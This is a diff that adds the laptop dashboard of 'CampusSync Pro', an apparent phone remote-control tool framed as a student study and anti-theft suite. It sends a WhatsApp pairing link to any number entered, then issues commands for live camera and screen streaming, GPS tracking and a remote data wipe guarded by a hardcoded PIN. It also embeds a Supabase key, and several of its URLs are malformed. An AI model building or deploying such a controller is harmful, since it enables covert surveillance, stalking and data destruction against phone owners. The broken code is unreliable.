@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CampusSync Pro — Multi-User Remote OS</title>
+  <script src="https://jsdelivr.net"></script>
+  <style>
+    * { box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+    body { background: #090d16; color: #f8fafc; margin: 0; padding: 24px; }
+    .container { max-width: 1100px; margin: auto; }
+    header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 16px; margin-bottom: 24px; }
+    h1 { color: #38bdf8; margin: 0; font-size: 26px; letter-spacing: -0.5px; }
+    .subtitle { color: #94a3b8; font-size: 13px; }
+    .status-pill { background: #064e3b; color: #34d399; padding: 6px 14px; border-radius: 99px; font-size: 13px; font-weight: 600; }
+    .card { background: #111827; border: 1px solid #1f2937; border-radius: 14px; padding: 20px; margin-bottom: 20px; }
+    .card h2 { margin: 0 0 14px 0; font-size: 16px; color: #e2e8f0; text-transform: uppercase; letter-spacing: 0.5px; }
+    .row { display: flex; gap: 10px; }
+    input, textarea { width: 100%; background: #090d16; border: 1px solid #374151; color: white; padding: 12px; border-radius: 8px; font-size: 14px; }
+    button { border: none; color: white; padding: 12px 16px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 13px; transition: 0.15s; white-space: nowrap; }
+    button:hover { filter: brightness(1.1); }
+    .grid { display: grid; grid-template-columns: 1fr 1.3fr; gap: 20px; }
+    .btn-list { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .bg-green { background: #16a34a; }
+    .bg-blue { background: #2563eb; }
+    .bg-indigo { background: #4f46e5; }
+    .bg-amber { background: #d97706; }
+    .bg-purple { background: #7c3aed; }
+    .bg-red { background: #dc2626; }
+    .bg-slate { background: #334155; }
+    .screen-box { background: #000; border: 2px solid #1f2937; border-radius: 12px; height: 340px; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; margin-bottom: 12px; }
+    .screen-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
+    .placeholder { color: #64748b; font-size: 14px; text-align: center; padding: 20px; }
+    .gps-box { background: #090d16; padding: 12px; border-radius: 8px; border: 1px solid #1f2937; font-size: 13px; margin-top: 12px; display: flex; justify-content: space-between; align-items: center; }
+    a { color: #38bdf8; text-decoration: none; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div>
+        <h1>CampusSync Pro</h1>
+        <div class="subtitle">Multi-User Remote Smartphone Control, Screen Mirroring & Anti-Theft Suite</div>
+      </div>
+      <div class="status-pill" id="sessionBadge">Session: Not Paired</div>
+    </header>
+
+    <!-- User Onboarding / WhatsApp Pairing -->
+    <div class="card">
+      <h2>1. Connect Any Student Smartphone</h2>
+      <div class="row">
+        <input id="phoneInput" type="text" placeholder="Enter any WhatsApp number (e.g., 919876543210)">
+        <button class="bg-green" onclick="createSessionAndSendWhatsApp()">📲 Generate & Send WhatsApp Link</button>
+      </div>
+    </div>
+
+    <div class="grid">
+      <!-- Left Column: Controls & Study Sync -->
+      <div>
+        <div class="card">
+          <h2>2. Remote Control & Anti-Theft</h2>
+          <div class="btn-list">
+            <button class="bg-blue" onclick="sendCommand('STREAM_CAMERA')">📹 Live Camera Feed</button>
+            <button class="bg-indigo" onclick="sendCommand('STREAM_SCREEN')">📱 Live Screen Mirror</button>
+            <button class="bg-amber" onclick="sendCommand('RING_ALARM')">🔔 Ring Max Volume</button>
+            <button class="bg-purple" onclick="sendCommand('GET_GPS')">📍 Locate via GPS</button>
+            <button class="bg-red" onclick="sendCommand('LOCK_SCREEN')">🔒 Remote Lock</button>
+            <button class="bg-red" onclick="confirmWipe()">⚠️ Wipe All Data</button>
+          </div>
+          <button class="bg-slate" style="width:100%; margin-top:10px;" onclick="sendCommand('IDLE')">⏹ Stop Stream / Reset</button>
+
+          <div class="gps-box">
+            <span id="gpsText">📍 GPS Location: Waiting for request...</span>
+            <a id="mapsLink" href="#" target="_blank" style="display:none;">Open Google Maps ↗</a>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2>3. Instant Study Clipboard Sync</h2>
+          <textarea id="clipInput" rows="2" placeholder="Paste study notes, links, or assignment text to push to phone..."></textarea>
+          <button class="bg-blue" style="width:100%; margin-top:10px;" onclick="pushClipboard()">⚡ Push Text to Phone Clipboard</button>
+        </div>
+      </div>
+
+      <!-- Right Column: Live Mirroring & Screenshot -->
+      <div class="card">
+        <h2>4. Live Phone Display & Camera</h2>
+        <div class="screen-box">
+          <img id="liveDisplay" style="display:none;">
+          <div id="placeholderText" class="placeholder">Pair your phone via WhatsApp, then click <b>Live Camera Feed</b> or <b>Live Screen Mirror</b>.</div>
+        </div>
+        <div class="row">
+          <button class="bg-blue" style="flex:1;" onclick="downloadScreenshot()">📸 Save Screenshot to Laptop</button>
+          <button class="bg-green" style="flex:1;" onclick="forwardWhatsApp()">📤 Share Alert on WhatsApp</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = 'https://uqzdaccxlhohtokmhuwt.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable__7g1PJaAUa1KmZxtbkTgjw_rnrXcOeI';
+    const db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    let currentSessionId = null;
+
+    async function createSessionAndSendWhatsApp() {
+      let phone = document.getElementById('phoneInput').value.trim().replace(/\D/g, '');
+      if (!phone) return alert("Please enter a phone number!");
+      if (phone.length === 10) phone = '91' + phone;
+
+      // Create unique session ID for this user
+      currentSessionId = 'CS-' + Math.floor(100000 + Math.random() * 900000);
+      document.getElementById('sessionBadge').innerText = '● Active Room: ' + currentSessionId;
+
+      await db.from('device_sessions').insert([{ session_id: currentSessionId, phone_number: phone }]);
+      subscribeToSession(currentSessionId);
+
+      // Automatically build the phone URL based on wherever laptop.html is hosted
+      const baseUrl = window.location.href.split('?')[0].replace('laptop.html', 'phone.html');
+      const pairUrl = `${baseUrl}?session=${currentSessionId}`;
+      const msg = encodeURIComponent(`CampusSync Pro Pairing Link (${currentSessionId}): Tap to connect your phone & grant permissions: ${pairUrl}`);
+      window.open(`https://wa.me{phone}?text=${msg}`, '_blank');
+    }
+
+    async function sendCommand(cmd) {
+      if (!currentSessionId) return alert("First enter a phone number and send the WhatsApp link!");
+      await db.from('device_sessions').update({ command: cmd }).eq('session_id', currentSessionId);
+    }
+
+    async function pushClipboard() {
+      if (!currentSessionId) return alert("Pair a phone first!");
+      const text = document.getElementById('clipInput').value;
+      await db.from('device_sessions').update({ clipboard_text: text, command: 'CLIPBOARD' }).eq('session_id', currentSessionId);
+      alert("Sent to phone!");
+    }
+
+    function confirmWipe() {
+      if (!currentSessionId) return alert("Pair a phone first!");
+      if (prompt("Enter Security PIN (1234) to wipe device:") === "1234") sendCommand('WIPE_DATA');
+    }
+
+    function downloadScreenshot() {
+      const img = document.getElementById('liveDisplay');
+      if (!img.src || img.style.display === 'none') return alert("No live feed active to capture!");
+      const a = document.createElement('a');
+      a.href = img.src;
+      a.download = `CampusSync_Capture_${Date.now()}.jpg`;
+      a.click();
+    }
+
+    function forwardWhatsApp() {
+      let phone = document.getElementById('phoneInput').value.trim().replace(/\D/g, '');
+      if (phone.length === 10) phone = '91' + phone;
+      const text = encodeURIComponent("CampusSync Security Alert: Remote capture/check completed from laptop dashboard.");
+      window.open(`https://wa.me{phone}?text=${text}`, '_blank');
+    }
+
+    function subscribeToSession(sessionId) {
+      db.channel('room-' + sessionId)
+        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'device_sessions', filter: `session_id=eq.${sessionId}` }, payload => {
+          const data = payload.new;
+          if (data.live_frame) {
+            const img = document.getElementById('liveDisplay');
+            img.src = data.live_frame;
+            img.style.display = 'block';
+            document.getElementById('placeholderText').style.display = 'none';
+          }
+          if (data.latitude && data.longitude) {
+            document.getElementById('gpsText').innerText = `📍 ${data.latitude}, ${data.longitude}`;
+            const link = document.getElementById('mapsLink');
+            link.href = `https://google.com{data.latitude},${data.longitude}`;
+            link.style.display = 'inline';
+          }
+        }).subscribe();
+    }
+  </script>
+</body>
+</html>
